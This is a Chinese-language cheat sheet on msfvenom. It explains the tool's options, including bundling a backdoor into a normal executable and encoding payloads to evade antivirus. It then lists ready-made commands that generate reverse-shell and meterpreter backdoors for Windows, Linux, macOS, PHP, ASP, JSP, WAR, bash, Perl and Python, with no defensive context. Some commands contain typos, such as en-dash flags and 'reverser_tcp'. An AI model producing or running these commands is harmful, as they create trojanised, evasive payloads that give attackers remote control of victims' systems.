# msfvenom 学习

## -p (--payload-options)
```angular2html
添加载荷payload。

载荷这个东西比较多，这个软件就是根据对应的载荷payload生成对应平台下的后门，所以只有选对payload，再填写正确自己的IP，PORT就可以生成对应语言，对应平台的后门了！！！

(- -payload-options 列出payload选项)
```

## -l
`查看所有payload encoder nops`

## -f （--help-formats）

```angular2html
输出文件格式。

(--help-formats 列出所有文件格式)

Executable formats:
asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, jar, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-net, psh-reflection, psh-cmd, vba, vba-exe, vba-psh, vbs, war
Transform formats:
bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript
```

## -e
``
编码免杀
``
## -a (--platform  --help-platforms)
```angular2html
选择架构平台
x86 | x64 | x86_64
Platforms:
windows, netware, android, java, ruby, linux, cisco, solaris, osx, bsd, openbsd, bsdi, netbsd, freebsd, aix, hpux, irix, unix, php, javascript, python, nodejs, firefox, mainframe
```

## -o

```angular2html
文件输出
```
## -s
```angular2html
生成payload的最大长度，就是文件大小。
```

## -b
```angular2html
避免使用的字符 例如：不使用'\0f'。
```
## -i

```angular2html
编码次数
```
## -c

```angular2html
添加自己的shellcode
```

## -x|-k

```angular2html
捆绑。
例如：原先有个正常文件normal.exe 
可以通过这个选项把后门捆绑到这个程序上面。
```
# 事例
## 普通生成
```angular2html
msfvenom -p <payload> <payload options> -f <format> -o <path>
msfvenom –p windows/meterpreter/reverse_tcp –f exe –o C:\back.exe
```
## 编码生成

```angular2html
msfvenom -p <payload> -e <encoder > -i <encoder times> -n <nopsled> -f <format> -o <path>
msfvenom –p windows/meterpreter/reverse_tcp –i 3 –e x86/shikata_ga_nai –f exe –o C:\back.exe
```
## 捆绑
```angular2html
msfvenom –p windows/meterpreter/reverse_tcp –platform windows –a x86 –x C:\nomal.exe –k –f exe –o C:\shell.exe
```

## Windows
```angular2html
msfvenom –platform windows –a x86 –p windows/meterpreter/reverse_tcp –i 3 –e x86/shikata_ga_nai –f exe –o C:\back.exe
msfvenom –platform windows –a x86 –p windows/x64/meterpreter/reverse_tcp –f exe –o C:\back.exe
```

## Linux
```angular2html
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
```

## MAC
```angular2html
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho
```

## PHP
```angular2html
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
```

## ASP
```angular2html
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
```
## ASPX
```angular2html
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f aspx > shell.aspx
```

## JSP
```angular2html
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
```

## war
```angular2html
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
```

## bash
```angular2html
msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On>-f raw > shell.sh
```
## Perl
```angular2html
msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
```

## python
```angular2html
msfvenom -p python/meterpreter/reverser_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py
```